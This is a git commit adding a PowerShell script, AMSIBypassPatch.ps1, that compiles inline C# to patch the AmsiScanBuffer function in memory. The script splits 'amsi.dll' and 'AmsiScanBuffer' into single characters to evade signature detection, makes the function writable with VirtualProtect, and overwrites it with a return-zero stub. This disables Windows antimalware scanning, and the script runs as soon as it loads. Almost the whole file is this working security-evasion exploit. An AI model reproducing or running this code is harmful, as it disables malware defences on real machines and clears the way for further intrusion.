618d4e4ce09493497e65c3f101edfe730c9a4180
Okan Kurtuluş <33905344+okankurtuluss@users.noreply.github.com>
2024-06-02 02:19:23 +0300

    Add files via upload

---
+++ AMSIBypassPatch.ps1
@@ -0,0 +1,34 @@
+function Disable-Protection {
+    $k = @"
+using System;
+using System.Runtime.InteropServices;
+public class P {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    public static bool Patch() {
+        IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + ".dll");
+        if (h == IntPtr.Zero) return false;
+        IntPtr a = GetProcAddress(h, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
+        if (a == IntPtr.Zero) return false;
+        UInt32 oldProtect;
+        if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
+        byte[] patch = { 0x31, 0xC0, 0xC3 };
+        Marshal.Copy(patch, 0, a, patch.Length);
+        return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
+    }
+}
+"@
+    Add-Type -TypeDefinition $k
+    $result = [P]::Patch()
+    if ($result) {
+        Write-Output "Protection Disabled"
+    } else {
+        Write-Output "Failed to Disable Protection"
+    }
+}
+
+Disable-Protection
